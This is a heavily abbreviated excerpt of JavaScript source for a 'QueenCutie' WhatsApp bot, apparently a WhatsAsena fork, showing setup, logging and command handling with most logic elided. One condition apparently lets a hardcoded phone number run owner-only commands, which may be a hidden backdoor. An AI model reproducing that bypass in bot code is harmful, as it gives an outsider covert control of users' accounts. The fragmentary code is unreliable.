...
const {Message, StringSession, Image, Video} = require('./CutieQueen/');
...
// Sql
const WhatsAsenaDB = config.DATABASE.define('CutieQueen', {
    info: {
...
${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    ...
    conn.on('credentials-updated', async () => {
        ...
        console.log(
            chalk.blueBright.italic('💞Connecting to QUEENCUTIE Database...')
        );
        ...
        console.log(chalk.bgGreen('�? QUEENCUTIE' + afwhasena));
        ...
        events.commands.map(
            async (command) =>  {
                ...
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((OWN.ff == "94712564306,0" && msg.key.fromMe === false && command.fromMe === true &&
                        ...
                        try {
                            ...
                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                ...
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QUEENCUTIE] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
